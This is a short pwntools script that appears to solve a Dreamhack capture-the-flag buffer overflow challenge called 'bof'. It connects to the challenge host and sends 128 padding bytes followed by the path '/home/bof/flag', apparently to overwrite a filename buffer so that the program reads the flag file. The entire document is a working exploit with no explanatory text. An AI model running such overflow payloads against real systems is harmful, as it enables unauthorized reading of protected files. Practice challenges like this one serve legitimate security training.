from pwn import *

context.arch = 'amd64'
context.terminal = ['terminator', '-e']

p = process('./bof')
p = remote('host3.dreamhack.games',20708)

payload = b"A" * 128 + b"/home/bof/flag\0"
print(payload)

p.sendlineafter(b'meow?', payload)

#gdb.debug('./bof') 

p.interactive()